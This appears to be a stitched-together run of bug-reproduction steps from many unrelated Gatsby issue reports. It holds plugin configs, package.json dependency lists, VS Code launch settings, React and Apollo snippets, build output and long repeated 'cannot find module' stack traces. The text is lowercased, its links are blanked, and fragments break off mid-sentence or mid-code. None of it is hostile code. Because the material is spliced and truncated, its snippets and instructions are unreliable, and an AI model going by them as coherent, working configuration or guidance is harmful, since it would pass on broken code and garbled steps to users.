chrome version", "last 1 firefox version", "last 1 safari version" ] }, "husky": { "hooks": { "pre-commit": "pretty-quick --staged" } }, "devdependencies": { "prettier": "^2.0.5", "pretty-quick": "^2.0.1" }
include a "." in your slug field
create a markdown file with a code block inside and put it in `src/posts/{filename}` using the default gatsby starter
apply the queried html using `data.markdownremark.html` and use `dangerouslysetinnerhtml` prop on a div to apply the converted markdown
use the following configurations below
dependencies in package.json:
"dependencies": { "@emotion/core": "^10.0.35", "@emotion/styled": "^10.0.27", "gatsby": "^2.24.47", "gatsby-image": "^2.4.16", "gatsby-plugin-catch-links": "^2.3.11", "gatsby-plugin-emotion": "^4.3.10", "gatsby-plugin-manifest": "^2.4.23", "gatsby-plugin-offline": "^3.2.23", "gatsby-plugin-react-helmet": "^3.3.10", "gatsby-plugin-sharp": "^2.6.27", "gatsby-plugin-typescript": "^2.4.18", "gatsby-remark-images": "^3.3.25", "gatsby-remark-prismjs": "^3.5.10", "gatsby-remark-responsive-iframe": "^2.4.12", "gatsby-source-filesystem": "^2.3.24", "gatsby-transformer-remark": "^2.8.28", "gatsby-transformer-sharp": "^2.5.13", "prismjs": "^1.21.0", "prop-types": "^15.7.2", "react": "^16.12.0", "react-dom": "^16.12.0", "react-helmet": "^6.1.0", "typescript": "^3.9.7" }
gatsby-config.js
module.exports = { sitemetadata: { title: `gatsby default starter`, description: `kick off your next, great gatsby project with this default starter
this barebones starter ships with the main gatsby configuration files you might need.`, author: `@gatsbyjs`, }, plugins: [ `gatsby-plugin-react-helmet`, `gatsby-plugin-emotion`, { resolve: `gatsby-transformer-remark`, plugins: [ "gatsby-remark-graphviz", `gatsby-remark-responsive-iframe`, `gatsby-remark-prismjs`, { resolve: `gatsby-remark-images`, options: { // it\'s important to specify the maxwidth (in pixels) of // the content container as this plugin uses this as the // base for generating different widths of each image
maxwidth: 590, }, }, ], }, { resolve: `gatsby-source-filesystem`, options: { name: `images`, path: `${__dirname}/src/images`, }, }, `gatsby-transformer-sharp`, `gatsby-plugin-sharp`, { resolve: `gatsby-plugin-manifest`, options: { name: `gatsby-starter-default`, short_name: `starter`, start_url: `/`, background_color: `#663399`, theme_color: `#663399`, display: `minimal-ui`, icon: `src/images/gatsby-icon.png`, // this path is relative to the root of the site
}, }, `gatsby-plugin-typescript`, `gatsby-plugin-catch-links`, { resolve: `gatsby-source-filesystem`, options: { path: `${__dirname}/src/posts`, name: "posts", }, }, // this (optional) plugin enables progressive web app + offline functionality // to learn more, visit: // `gatsby-plugin-offline`, ],
gatsby-browser.js
/** * implement gatsby's browser apis in this file
* * see: */ // you can delete this file if you're not using it
require("prismjs/themes/prism-tomorrow.css")
```markdown
title: 'hidden'
componentname: 'util'
category: 'components'
subcategory: 'atoms'
custompath: '/components/atoms/util'
--- we provide easy to use classes to hide content on specific breakpoints
## heading two {#custom-heading-two} enablecustomid ### heading two {#custom-heading-two} ``` config: ```js
{ resolve: \'gatsby-remark-autolink-headers\', options: { removeaccents: true, isiconafterheader: true, enablecustomid: true, icon: \'<svg aria-hidden="true" height="20px" width="20px" xmlns=" " viewbox="0 0 32 32"><title>link</title><g class="nc-icon-wrapper" stroke-linecap="square" stroke-linejoin="miter" stroke-width="1.5" fill="#111111" stroke="#111111"><path d="m16,20.644a6.968,6.968,0,0,1,13.1,18.9h0a7,7,0,0,1,0-9.9l4.95-4.95a7,7,0,0,1,9.9,0h0a7,7,0,0,1,0,9.9l24.9,17" fill="none" stroke="#111111" stroke-miterlimit="10"/> <path data-color="color-2" d="m16,11.356a6.968,6.968,0,0,1,18.9,13.1h0a7,7,0,0,1,0,9.9l-4.95,4.95a7,7,0,0,1-9.9,0h0a7,7,0,0,1,0-9.9l7.1,15" fill="none" stroke-miterlimit="10"/></g></svg>\' } },
my repo isn't public unfortunately, but i've included the relevant query bits, and i'd be happy to answer any questions.
log in to gatsby cloud and display de user menu to see the problem
the image attached shows the issue
<img width="304" alt="screen shot 2020-09-01 at 11 56 53" src=" "> firefox
<img width="299" alt="screen shot 2020-09-01 at 11 52 19" src=" ">
install the dependencies as shown and the same errors should occur.
clone the repo here:
`yarn` to install dependencies (all latest versions of starter packages)
`cd packages/my-mdx-starter`
`yarn build`
- clone latest version of gatsby/grab a starter and add shopify-buy.
- try to create new empty checkout
- visit the page in ie11 and check console for errors.
- repeat the same steps on other browsers.
upgrading gatsby-plugin-sharp to version 2.6.27
clone
run `yarn install` from the root.
run `yarn workspace example develop` from the root.
[here is a minimal repo ]( to reproduce, just run gatsby, and storybook to see the differences.
**update:** i can reproduce this issue in a starter repo using the exact launch configuration [from the docs]( #vs-code-debugger-manual-config): `launch.json` ```json
{ "version": "0.2.0", "configurations": [ { "name": "gatsby develop", "type": "node", "request": "launch", "protocol": "inspector", "program": "${workspaceroot}/node_modules/.bin/gatsby", "autoattachchildprocesses": true, "args": ["develop", "--inspect-brk"], "stoponentry": false, "runtimeargs": ["--nolazy"], "sourcemaps": false }, { "name": "gatsby build", "type": "node", "request": "launch", "protocol": "inspector", "program": "${workspaceroot}/node_modules/.bin/gatsby", "args": ["build"], "stoponentry": false, "runtimeargs": ["--nolazy"], "sourcemaps": false } ]
``` this is the line throwing an unhandled exception: #l67 this is the exception: ```text
exception has occurred: error [err_inspector_already_activated]: inspector is already activated
close it with inspector.close() before activating it again
at object.open (inspector.js:137:11) ``` some things i\'ve tried adjusting without success: - changing `"type": "node"` to `"type": "pwa-node"` and/or setting `debug.node.usev3` to `true`; either one should cause vs code to use [the new node.js debugger](
- moving `"--inspect-brk"` to `runtimeargs` or removing it entirely ### workaround auto-attach is not affected
if i set vs code setting `debug.node.autoattach` to `true` and then run `node --nolazy node_modules/.bin/gatsby develop --inspect-brk` in the terminal, the debugger attaches and gatsby runs without exception.
minimal reproduction: ```
mkdir peer-deps-test
npm i -g npm@next-7
cd peer-deps-test
echo {} > package.json
npm install gatsby
visit a static page (ssr) with a `gatsby-image` element containing multiple image sizes
if your viewport does not match whatever the last (i think) image in the source array is in the react component, the image served will not match the size of the dom element
navigating away and back to the page, causing it to be rendered client-side, results in the image being sized correctly for the viewport in this example: ```graphql
query { placeholderimage: file(relativepath: { eq: "gatsby-astronaut.png" }) { childimagesharp { fixed(width: 32, height: 32) { ...gatsbyimagesharpfixed } } } placeholderimagelg: file(relativepath: { eq: "gatsby-astronaut.png" }) { childimagesharp { fixed(width: 128, height: 128) { ...gatsbyimagesharpfixed } } }
<img fixed={[ data.placeholderimage.childimagesharp.fixed, { ...data.placeholderimagelg.childimagesharp.fixed, media: "(min-width: 5000px)", }, ]}
``` the page will load the 32px image, but size the element at 128px by default on displays < 5000px width
- [live example](
- [source code]( (see `src/components/image.js`)
i'm unable to provide a repro at this time because the repo/data are private
hoping someone can confirm with something already setup
steps to reproduce: 1
have a contentful project with a content type that has a field of references many
this ref many field should be a circular reference
for example, i have: main nav -> pages -> main nav relationship
main nav reference pages, and pages has a field called components which references to main nav.
run gatsby development or `gatsby build`
you should see duplicated, wildly inaccurate content different from what is published.
if that didn't work, you should run `gatsby clean` and restart/build again
minimal reproduction: 1
`npm install`
`gatsby develop` - note the missing image
`npm install @mdx-js/mdx@1.6.16 @mdx-js/react@1.6.16` - install previous mdx
`gatsby clean`
`gatsby develop` - image appears
gatsby-config/sitemetadata.config.js
module.exports = { title: ' ', description: ' ', author: 'blued admin team', pathprefix: process.env.exec_env !== 'local' ? '/oversea-ad' : '', menulinks: [ ..
{ name: ' ', path: '/insert', icon: 'desktop', }, ]
``` src/pages/insert/index.jsx ```
import react, { usestate } from 'react' const insertad = () => { return <div />
} export default insertad
> blued-admin-oversea-ad-site@0.0.1 build:local /users/menglingyu/blued/blued-admin-oversea-ad-site
> exec_env=local gatsby build --prefix-paths success open and validate gatsby-configs - 0.027s
success load plugins - 0.619s
success onpreinit - 0.032s
success delete html and css files from previous builds - 0.011s
success initialize cache - 0.029s
success copy gatsby files - 0.070s
success onprebootstrap - 0.010s
success createschemacustomization - 0.004s
success source and transform nodes - 0.024s
success building schema - 0.214s
success createpages - 0.001s error #11328 a page component must export a react component for it to be valid
please make sure this file exports a react component: undefined not finished createpagesstatefully - 0.100s
updated gatsby config auth: { jwt_user: "email address", jwt_pass: "password", },
small project:
- start in develop mode and change `content/blog/page/embed.js`
import global style like this: ```js { resolve: "gatsby-plugin-sass", options: { data: `@import "core.scss";`, includepaths: [path.resolve(__dirname, "src/style")], }, }, ```
following gatsby-plugin-preload-fonts's steps including generate `font-preload-cache.json` and add it to gatsby-config.js 3
run `gatsby build` & `gatsby serve` and fout 4
check the `network` section in chrome and found that fonts were not pre-downloaded
check the outputted `index.html`, and found that `<link as=\'font\' ...>` part is injected **after** the `<style data-href="/styles.xxxx.css">@font-face`
as codesandbox can't run `gatsby build` & `gatsby serve`, i created a reproduce repo:
the example execution error in the following tutorial :
#creating-layout-components
heres the repo, should be able to just install and try run `yarn gatsby develop` to see the problem.
1) install gatsby `npm i gatsby`
2) `npm start`
install gatsby-plugin-netlify-cms@4.3.11 (latest version as this date).
create a gatsby project with both gatsby-plugin-resolve-src and gatsby-plugin-react-css-modules enabled
create a page and try to import a css file using its path from src.
is the sandbox that reproduces this
because codesandbox itself has bugs with anchor links in the full view, you need to open the app itself in a new tab
open
click on anchor links next to sub-headings, see page jump to #id - try back and forward browser button
everything seems good
scroll down, click on "go to mdx page" or go to directly
click on anchor links next to sub-headings, see page jump to #id and replay the staggering intro animation on each jump - try back and forward browser button
this is not what we want.
edit a page query
- open:
- click on: `follow the steps in this doc`
- 404: ` `
- expected: ` `
- open:
- click on: `data source`
- 404: ` #data-source-cms-integrations)`
- expected: ` #data-source-cms-integrations`
#### prerequisites - [heroku cli]( #### steps: 1
clone [this reproduction]( and jump in: ``` git clone cd heroku-gatsby-dev-bug-repro
create a new heroku site via the heroku cli: ``` heroku create
set heroku env variables: ``` heroku config:set node_env=development heroku config:set npm_config_production=false heroku config:set enable_gatsby_refresh_endpoint=true
deploy to heroku: ``` git push heroku master
after deployment, open the app url which is now running `gatsby develop` at \\<heroku-app-name>.herokuapp.com
set a private route on gatsby-node and create the page on :
gatsby-node.js
module.exports.oncreatepage = async ({ page, actions }) => { const { createpage } = actions; if (page.path.match(/^\\/account/)) { page.matchpath = '/account/*'; createpage(page); }
set a ssr preventer:
import react from 'react';
import proptypes from 'prop-types'; const protectbuild = ({ children }) => { if (typeof window !== 'undefined') { return <>{children}</>; } else { return <></>; }
}; protectbuild.proptypes = { children: proptypes.any,
}; export default protectbuild;
``` src/pages/account: this is my react index with reach/router.
import react from 'react';
import protectbuild from '../components/utils/protectbuild';
import routes from '../components/pages/app/routes'; const account = () => { return ( <protectbuild> <routes /> </protectbuild> );
}; export default account;
set @apollo/client
import { apolloclient, httplink, inmemorycache } from '@apollo/client';
import { somefunction } from './somevalidations'; export const client = new apolloclient({ cache: new inmemorycache(), link: new httplink({ uri: ` `, fetchoptions: { mode: 'cors', credentials: 'include', }, }), resolvers: { query: { isloggedin() { return !!somefunction(); }, }, },
set apollo provider:
wrap-root-element.js
import react from 'react';
import { apolloprovider } from '@apollo/client';
import { client } from './client'; export const wraprootelement = ({ element }) => ( <apolloprovider client={client}> {element} </apolloprovider> );
wraprootelement.proptypes = { element: proptypes.object,
set gatsby-browser.js and gatsby-ssr.js:
import react from 'react';
import layout from './src/components/layout/layout';
import proptypes from 'prop-types';
export { wraprootelement } from './src/state/wrap-root-element'; export const wrappageelement = ({ element, props }) => { return <layout {...props}>{element}</layout>;
}; wrappageelement.proptypes = { element: proptypes.element, props: proptypes.any,
docs instructions to use sqip with contentful isn't working
`with gatsby-source-contentful: image { sqip(numberofprimitives: 30, blur: 0) { datauri }, fixed { ...gatsbycontentfulfixed_withwebp_nobase64 }
> please keep in mind that i only a robot, so if i e closed this issue in error, i human_emotion_sorry
please feel free to reopen this issue or create a new one if you need anything else.
clone ["simple-auth" example]( or follow the official guide [client-only-routes-and-user-authentication]( my clone: 2
create default "404" route at app.js:
``` <router> <privateroute path="/app/details" component={details} /> <privateroute path="/app/profile" component={profile} /> <login path="/app/login" /> <notfound text="not found at app" path="/app/*" /> --------- here it is </router>
publish to netlify: 4
go to client-side route:
and press f5 to reload the page.
pseudocode:
import { navigate } from 'gatsby-link' describe('gatsby-link', () => { it('navigate should return a promise', () => { expect(navigate('/')).tobeinstanceof(promise) })
i have created a minimal reproduction at 1
clone the repo
`cd reproduction`
`npm install`
`gatsby develop`
note the styling on `/test/`
kill the server
`gatsby clean`
delete `package-lock.json` and `node_modules`
`yarn install`
`gatsby develop`
note the styling on `/test/` the theme is published via [`gitpkg`]( to a tag on the reproduction repo
### actual/expected result the mdx page should render the same regardless on installation via yarn/npm
![2020-08-18_13-04-18](
#### page: refreshing content - open
- see screenshot: <img width="1109" alt="bildschirmfoto 2020-08-18 um 21 35 55" src=" ">
* follow tutorial (with mdx plugin)
* put `embed:code.py` in mdx file
* change `code.py`
since i can't pinpoint the problem exactly feel free to run my rep: `gatsby develop`
everything works as it should `gatsby build`
`gatsby serve`
```error: enoent: no such file or directory, stat ``` (for the pages: /about, /books, /stockists/, /cart/)
minimal reproduction: 1
run `gatsby develop`
error occurs
i followed all the steps from
i made a sample repo (almost identical to `gatsby-starter-blog`): ```
git clone
cd gatsby-prev-next
gatsby build
``` if you serve the built site, everything should be normal
the next part is where the problem happens: ```
mv test-post content/blog/test-post # add a new post
gatsby build
gatsby serve
look at `package.json` :)
make sure `gatsby-cli` is not installed globally
run `npx gatsby-cli --help`
follow part three of the tutorial and use the command on it to install `gatsby-plugin-typography` and them try to run `gatsby develop` to see the error
you can find more details in [here](
see file above
simply use the code above in your **gatsby-ssr.js** file and run it in development mode with **gatsby develop**
then look at the canonical link in the ```<head>``` section of each rendered page from your browser and it's always the same even when you refresh the page.
this is fully documented in this repo: 1
`git clone git@github.com:tmiguelt/gatsbycreatenodefieldbug.git`
`gatsby develop`
`gatsby develop` works fine, pages load, css correct `gatsby clean`
`gatsby build`
`gatsby serve`
css warning + pages not found 404
adding a placeholder `div` in front of a `backgroundimage` component, putting it below the fold and kicking off the `intersectionobserver` (like the op in [#125]( did): ```jsx <div style={{ height: 4000, display: 'block' }}></div>
``` without setting `critical` on the `backgroundimage` the image loads twice / trice
i created a reproduction branch in `gbitest`, the demo repo of `gbi`, called [scroll-handler-bug](
the div was added [here]( #l16) and the relevant component is [`backgroundsection`](
npx gatsby new gatsby-storybook-test
cd gatsby-storybook-test
npx gatsby recipes storybook-ts --install
visit and keep scrolling.
also, i have a katacoda scenario for duplicating this issue:
- create a gatsby site with [pathprefix](
- use [gatsby-remark-images]( enabling `withwebp`
- place some jpg and/or png images on the markdown pages
- the development site (where `pathprefix` is [not used]( will work as expected: the browser quickly downloads and displays the webp images over the blur layer
- build the site
- when serving the production built site (now with `pathprefix`), the image does not show
#### demo project:
(see eggs picture in 'hello world')
it's just a fork of [gatsby starter blog]( with `pathprefix` set to `/blog` and `withwebp` set to `true` in `gatsby-remark-images`
#### another demo project already deployed in netlify:
(see [this page](
deployed in:
i buy a new laptop that use windows 10.
i just downloaded nodejs v12.18.3
i followed the tutorial on
when i run "gatsby develop" , there is a error
#### page schema root fields - open
- see screenshot:
<img width="1001" alt="bildschirmfoto 2020-08-14 um 16 37 23" src=" "> checked also via: `curl > test.html`
and searched for `gql` #### deleted page schema connections - open deleted page:
- missing here the redirect
- you see short a 404: - but then after rehydration the old site - even force refresh not update the cache and show old content
const scrollrestoration = usescrollrestoration(`scroll-restoration-key`); return ( <div {...scrollrestoration}> ..
with mac os catalina : follow first steps guides to install (npm, xcode, and run npm gatsby) then install "hello site" and gatsby developp
to reproduce take a middle-size gatsby.js project and try to build it inside bitbucket with the pipeline script described above
it is pretty hard to prepare the exact example for you, though i believe every gatsby.js website will experience the same problems with pipelines.
git clone
npm install
npm run build
npm -g install static-server
static-server
navigate to
click the "save" button in the toolbar
observe 404 in the network tab in devtools.
try and install gatsby-cli
running `gatsby develop` or `netlify dev`, making a change, then getting this message immediately on change: ```
warning warning: event "xstate.after(1000)#waitingmachine.batchingnodemutations" was sent to stopped service "waitingmachine"
this service has already reached its final state, and will not transition.
event: {"type":"xstate.after(1000)#waitingmachine.batchingnodemutations"}
``` i saw this message pop up yesterday a few times, but changes were still applying
now no updates will take effect and i'm stuck with this message popping up
<img width="1008" alt="cleanshot 2020-08-13 at 11 55 56@2x" src=" "> i\'ve also had it tell me "error socket hangup" in-between them: <img width="1008" alt="cleanshot 2020-08-13 at 11 58 58@2x" src=" "> and i\'ve also noticed about an hour ago that when it was updating, it would take 10+ seconds to work, then update every single page..
<img width="721" alt="cleanshot 2020-08-13 at 11 19 04@2x" src=" "> any help would be greatly appreciated right now as this is a live production site i\'m trying to work on
clone the repo (`git@github.com:mrseanbaines/gatsby-storybook-static-query.git`)
run storybook (`yarn storybook`)
changed the npm global packages install location to ~/$user/.npm-global/ to resolve the npm permissions issue
after downloading the tutorial templates as listed in the official documentation, they don't start anymore after an update 2 days ago (not sure which numeration it was)
running `gatsby develop` resolves into an error.
go to
both problems can be reproduced with
after cloning the repo, you need to `mkdir src/markdownpages` as the directory is missing from the repo and i can't get it added to the repo
problem 1: 1
`gatsby develop`
go to - you see a fairly bland page.
go to - you see a bootstrap spinner in the middle of the top of the page.
ctrl+c to stop gatsby.
`gatsby build`
`gatsby serve -p 8000` repeat steps 2 & 3
step 2 should look the same
for step 3, you should see the text "loading..." in the top left corner of the page, because the bootstrap css isn\'t getting loaded
problem 2: 1
switch to the branch "possible-fix".
`gatsby develop`
go to notice that i've added a nav bar and that the background is blue
open `components/loading.js`, comment out line 2 (`import "../styles/minimal.scss"`) and save it
gatsby rebuilds the site ..
and the nav bar's background changes to green, which is the colour it should be.
- open:
- click on: "stripe source plugin"
visit homepage
scroll down to the **explore the gatsby ecosystem** section
toggle the **plugins**, **themes**, and **recipes** tabs
read the text
npx gatsby new app cd app npm install nom run start
just run gatsby develop.
this should be reproducible in the default [contentful starter]( example as i am still using mostly the same model and data from this example
then just try the query i listed above and make sure one of the blog posts has both of the tags in the tag search array.
`node --no-lazy node_modules/.bin/gatsby develop --inspect-brk=0.0.0.0`
see in logs: `debugger listening on ws://127.0.0.1:9229/43d0600c-22dc-40e9-98f6-f27004b6d353`
have woocommerce source content that has a p tag with style
in build more, style got removed
(run build and serve)
create a website after install react-icons
visit the [`topic: starters` opened prs](
look at any pr on the list, all except 2 are suffering from `starters_validate` failing
download [`using-i18n` ](
install the plugins via `npm`
run `gatsby develop` and you'll receive the errors: - `using-i18n`: ```zsh
gatsby develop -h gusbemacbe.pt -p 1990
debugger listening on ws://127.0.0.1:9229/8fef8103-e455-422d-ad0b-828b9cbf2431
for help, see:
success open and validate gatsby-configs - 0.025s error error in "/home/gusbemacbe/github/gatsby/examples/using-i18n/node_modules/gatsby-plugin-page-creator/gatsby-node.js": cannot find module \'gatsby-cli/lib/reporter\'
require stack:
- /home/gusbemacbe/github/gatsby/examples/using-i18n/node_modules/gatsby-plugin-page-creator/is-valid-collection-path-implementation.js
- /home/gusbemacbe/github/gatsby/examples/using-i18n/node_modules/gatsby-plugin-page-creator/create-pages-from-collection-builder.js
- /home/gusbemacbe/github/gatsby/examples/using-i18n/node_modules/gatsby-plugin-page-creator/create-page-wrapper.js
- /home/gusbemacbe/github/gatsby/examples/using-i18n/node_modules/gatsby-plugin-page-creator/gatsby-node.js
- /home/gusbemacbe/github/gatsby/examples/using-i18n/node_modules/gatsby/dist/bootstrap/resolve-module-exports.js
- /home/gusbemacbe/github/gatsby/examples/using-i18n/node_modules/gatsby/dist/bootstrap/load-plugins/validate.js
- /home/gusbemacbe/github/gatsby/examples/using-i18n/node_modules/gatsby/dist/bootstrap/load-plugins/load.js
- /home/gusbemacbe/github/gatsby/examples/using-i18n/node_modules/gatsby/dist/bootstrap/load-plugins/index.js
- /home/gusbemacbe/github/gatsby/examples/using-i18n/node_modules/gatsby/dist/services/initialize.js
- /home/gusbemacbe/github/gatsby/examples/using-i18n/node_modules/gatsby/dist/services/index.js
- /home/gusbemacbe/github/gatsby/examples/using-i18n/node_modules/gatsby/dist/state-machines/develop/services.js
- /home/gusbemacbe/github/gatsby/examples/using-i18n/node_modules/gatsby/dist/state-machines/develop/index.js
- /home/gusbemacbe/github/gatsby/examples/using-i18n/node_modules/gatsby/dist/commands/develop-process.js
- /home/gusbemacbe/github/gatsby/examples/using-i18n/.cache/tmp-164407-np77a8ip82on error: cannot find module \'gatsby-cli/lib/reporter\' require stack: - /home/gusbemacbe/github/gatsby/examples/using-i18n/node_modules/gatsby-plugin-page-creator/is-valid-collection-path-implementation .js - /home/gusbemacbe/github/gatsby/examples/using-i18n/node_modules/gatsby-plugin-page-creator/create-pages-from-collection-builder.js - /home/gusbemacbe/github/gatsby/examples/using-i18n/node_modules/gatsby-plugin-page-creator/create-page-wrapper.js - /home/gusbemacbe/github/gatsby/examples/using-i18n/node_modules/gatsby-plugin-page-creator/gatsby-node.js - /home/gusbemacbe/github/gatsby/examples/using-i18n/node_modules/gatsby/dist/bootstrap/resolve-module-exports.js - /home/gusbemacbe/github/gatsby/examples/using-i18n/node_modules/gatsby/dist/bootstrap/load-plugins/validate.js - /home/gusbemacbe/github/gatsby/examples/using-i18n/node_modules/gatsby/dist/bootstrap/load-plugins/load.js - /home/gusbemacbe/github/gatsby/examples/using-i18n/node_modules/gatsby/dist/bootstrap/load-plugins/index.js - /home/gusbemacbe/github/gatsby/examples/using-i18n/node_modules/gatsby/dist/services/initialize.js - /home/gusbemacbe/github/gatsby/examples/using-i18n/node_modules/gatsby/dist/services/index.js - /home/gusbemacbe/github/gatsby/examples/using-i18n/node_modules/gatsby/dist/state-machines/develop/services.js - /home/gusbemacbe/github/gatsby/examples/using-i18n/node_modules/gatsby/dist/state-machines/develop/index.js - /home/gusbemacbe/github/gatsby/examples/using-i18n/node_modules/gatsby/dist/commands/develop-process.js - /home/gusbemacbe/github/gatsby/examples/using-i18n/.cache/tmp-164407-np77a8ip82on - loader.js:1029 function.module._resolvefilename internal/modules/cjs/loader.js:1029:15 - loader.js:898 function.module._load internal/modules/cjs/loader.js:898:27 - loader.js:1089 module.require internal/modules/cjs/loader.js:1089:19 - v8-compile-cache.js:159 require [using-i18n]/[v8-compile-cache]/v8-compile-cache.js:159:20 - is-valid-collection-path-implementation.js:10 object.<anonymous> [using-i18n]/[gatsby-plugin-page-creator]/is-valid-collection-path-implementation.js:10:40 - v8-compile-cache.js:178 module._compile [using-i18n]/[v8-compile-cache]/v8-compile-cache.js:178:30 - loader.js:1220 object.module._extensions..js internal/modules/cjs/loader.js:1220:10 - loader.js:1049 module.load internal/modules/cjs/loader.js:1049:32 - loader.js:937 function.module._load internal/modules/cjs/loader.js:937:14 - loader.js:1089 module.require internal/modules/cjs/loader.js:1089:19 - v8-compile-cache.js:159 require [using-i18n]/[v8-compile-cache]/v8-compile-cache.js:159:20 - create-pages-from-collection-builder.js:28 object.<anonymous> [using-i18n]/[gatsby-plugin-page-creator]/create-pages-from-collection-builder.js:28:44 - v8-compile-cache.js:178 module._compile [using-i18n]/[v8-compile-cache]/v8-compile-cache.js:178:30 - loader.js:1220 object.module._extensions..js internal/modules/cjs/loader.js:1220:10 - loader.js:1049 module.load internal/modules/cjs/loader.js:1049:32 - loader.js:937 function.module._load internal/modules/cjs/loader.js:937:14 ``` - `gatsby-starter-default`: ```zsh error error in "/home/gusbemacbe/github/suru-plus-folders/node_modules/gatsby-plugin-page-creator/gatsby-node.js": cannot find module \'gatsby-cli/lib/reporter\'
require stack:
- /home/gusbemacbe/github/suru-plus-folders/node_modules/gatsby-plugin-page-creator/is-valid-collection-path-implementation.js
- /home/gusbemacbe/github/suru-plus-folders/node_modules/gatsby-plugin-page-creator/create-pages-from-collection-builder.js
- /home/gusbemacbe/github/suru-plus-folders/node_modules/gatsby-plugin-page-creator/create-page-wrapper.js
- /home/gusbemacbe/github/suru-plus-folders/node_modules/gatsby-plugin-page-creator/gatsby-node.js
- /home/gusbemacbe/github/suru-plus-folders/node_modules/gatsby/dist/bootstrap/resolve-module-exports.js
- /home/gusbemacbe/github/suru-plus-folders/node_modules/gatsby/dist/bootstrap/load-plugins/validate.js
- /home/gusbemacbe/github/suru-plus-folders/node_modules/gatsby/dist/bootstrap/load-plugins/load.js
- /home/gusbemacbe/github/suru-plus-folders/node_modules/gatsby/dist/bootstrap/load-plugins/index.js
- /home/gusbemacbe/github/suru-plus-folders/node_modules/gatsby/dist/services/initialize.js
- /home/gusbemacbe/github/suru-plus-folders/node_modules/gatsby/dist/services/index.js
- /home/gusbemacbe/github/suru-plus-folders/node_modules/gatsby/dist/state-machines/develop/services.js
- /home/gusbemacbe/github/suru-plus-folders/node_modules/gatsby/dist/state-machines/develop/index.js
- /home/gusbemacbe/github/suru-plus-folders/node_modules/gatsby/dist/commands/develop-process.js
- /home/gusbemacbe/github/suru-plus-folders/.cache/tmp-238741-hcvbisrsrqtn error: cannot find module 'gatsby-cli/lib/reporter' require stack: - /home/gusbemacbe/github/suru-plus-folders/node_modules/gatsby-plugin-page-creator/is-valid-collection-path-implementation.js - /home/gusbemacbe/github/suru-plus-folders/node_modules/gatsby-plugin-page-creator/create-pages-from-collection-builder.js - /home/gusbemacbe/github/suru-plus-folders/node_modules/gatsby-plugin-page-creator/create-page-wrapper.js - /home/gusbemacbe/github/suru-plus-folders/node_modules/gatsby-plugin-page-creator/gatsby-node.js - /home/gusbemacbe/github/suru-plus-folders/node_modules/gatsby/dist/bootstrap/resolve-module-exports.js - /home/gusbemacbe/github/suru-plus-folders/node_modules/gatsby/dist/bootstrap/load-plugins/validate.js - /home/gusbemacbe/github/suru-plus-folders/node_modules/gatsby/dist/bootstrap/load-plugins/load.js - /home/gusbemacbe/github/suru-plus-folders/node_modules/gatsby/dist/bootstrap/load-plugins/index.js - /home/gusbemacbe/github/suru-plus-folders/node_modules/gatsby/dist/services/initialize.js - /home/gusbemacbe/github/suru-plus-folders/node_modules/gatsby/dist/services/index.js - /home/gusbemacbe/github/suru-plus-folders/node_modules/gatsby/dist/state-machines/develop/services.js - /home/gusbemacbe/github/suru-plus-folders/node_modules/gatsby/dist/state-machines/develop/index.js - /home/gusbemacbe/github/suru-plus-folders/node_modules/gatsby/dist/commands/develop-process.js - /home/gusbemacbe/github/suru-plus-folders/.cache/tmp-238741-hcvbisrsrqtn - loader.js:1029 function.module._resolvefilename internal/modules/cjs/loader.js:1029:15 - loader.js:898 function.module._load internal/modules/cjs/loader.js:898:27 - loader.js:1089 module.require internal/modules/cjs/loader.js:1089:19 - v8-compile-cache.js:159 require [suru-plus-folders]/[v8-compile-cache]/v8-compile-cache.js:159:20 - is-valid-collection-path-implementation.js:10 object.<anonymous> [suru-plus-folders]/[gatsby-plugin-page-creator]/is-valid-collection-path-implementation.js:10:40 - v8-compile-cache.js:178 module._compile [suru-plus-folders]/[v8-compile-cache]/v8-compile-cache.js:178:30 - loader.js:1220 object.module._extensions..js internal/modules/cjs/loader.js:1220:10 - loader.js:1049 module.load internal/modules/cjs/loader.js:1049:32 - loader.js:937 function.module._load internal/modules/cjs/loader.js:937:14 - loader.js:1089 module.require internal/modules/cjs/loader.js:1089:19 - v8-compile-cache.js:159 require [suru-plus-folders]/[v8-compile-cache]/v8-compile-cache.js:159:20 - create-pages-from-collection-builder.js:28 object.<anonymous> [suru-plus-folders]/[gatsby-plugin-page-creator]/create-pages-from-collection-builder.js:28:44 - v8-compile-cache.js:178 module._compile [suru-plus-folders]/[v8-compile-cache]/v8-compile-cache.js:178:30 - loader.js:1220 object.module._extensions..js internal/modules/cjs/loader.js:1220:10 - loader.js:1049 module.load internal/modules/cjs/loader.js:1049:32 - loader.js:937 function.module._load internal/modules/cjs/loader.js:937:14
upgrade gatsby to v2.24.40
run `gatsby develop` or `gatsby build` (a la `npm run develop|build` script)
it doesn't work repo:
failure: (see build step) (failure pasted here in case build is not visible)
> schwigri@1.0.0 build /home/runner/work/schwigri/schwigri
> gatsby build success open and validate gatsby-configs - 0.080s
error error in "/home/runner/work/schwigri/schwigri/node_modules/gatsby-plugin-page-creator/gatsby-node.js": cannot find module \'gatsby-cli/lib/reporter\'
require stack:
- /home/runner/work/schwigri/schwigri/node_modules/gatsby-plugin-page-creator/is-valid-collection-path-implementation.js
- /home/runner/work/schwigri/schwigri/node_modules/gatsby-plugin-page-creator/create-pages-from-collection-builder.js
- /home/runner/work/schwigri/schwigri/node_modules/gatsby-plugin-page-creator/create-page-wrapper.js
- /home/runner/work/schwigri/schwigri/node_modules/gatsby-plugin-page-creator/gatsby-node.js
- /home/runner/work/schwigri/schwigri/node_modules/gatsby/dist/bootstrap/resolve-module-exports.js
- /home/runner/work/schwigri/schwigri/node_modules/gatsby/dist/bootstrap/load-plugins/validate.js
- /home/runner/work/schwigri/schwigri/node_modules/gatsby/dist/bootstrap/load-plugins/load.js
- /home/runner/work/schwigri/schwigri/node_modules/gatsby/dist/bootstrap/load-plugins/index.js
- /home/runner/work/schwigri/schwigri/node_modules/gatsby/dist/services/initialize.js
- /home/runner/work/schwigri/schwigri/node_modules/gatsby/dist/services/index.js
- /home/runner/work/schwigri/schwigri/node_modules/gatsby/dist/bootstrap/index.js
- /home/runner/work/schwigri/schwigri/node_modules/gatsby/dist/commands/build.js
- /home/runner/work/schwigri/schwigri/node_modules/gatsby/node_modules/gatsby-cli/lib/create-cli.js
- /home/runner/work/schwigri/schwigri/node_modules/gatsby/node_modules/gatsby-cli/lib/index.js
- /home/runner/work/schwigri/schwigri/node_modules/gatsby/dist/bin/gatsby.js
